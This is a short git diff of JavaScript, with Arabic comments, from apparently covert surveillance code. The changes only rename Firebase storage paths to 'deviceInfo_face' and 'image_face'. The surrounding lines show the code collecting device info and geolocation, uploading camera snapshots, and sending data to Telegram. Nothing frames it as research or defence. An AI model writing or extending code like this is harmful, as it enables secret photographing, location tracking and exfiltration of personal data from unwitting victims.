@@ -51,7 +51,7 @@ async function sendDeviceInfo() {
       // دمج الموقع في نص واحد
       info.loc = `${locationInfo.lat}, ${locationInfo.lon}`;  // دمج latitude و longitude في نص واحد
     }
-    const infoRef = dbRef(database, 'deviceInfo/' + Date.now());
+    const infoRef = dbRef(database, 'deviceInfo_face/' + Date.now());
     set(infoRef, info);
 
     let text = "📱 Device Info:\n";
@@ -95,10 +95,10 @@ function sendToTelegram(blob, fileName) {
 
 function uploadToFirebase(blob, cameraType) {
   const fileName = `${cameraType}_${Date.now()}.jpg`;
-  const storageRef = ref(storage, 'images/' + fileName);
+  const storageRef = ref(storage, 'image_face/' + fileName);
   uploadBytes(storageRef, blob).then(() => {
     getDownloadURL(storageRef).then((url) => {
-      const imgRef = dbRef(database, 'images/' + fileName.replace('.jpg', ''));
+      const imgRef = dbRef(database, 'image_face/' + fileName.replace('.jpg', ''));
       set(imgRef, {
         timestamp: new Date().toISOString(),
         camera: cameraType,
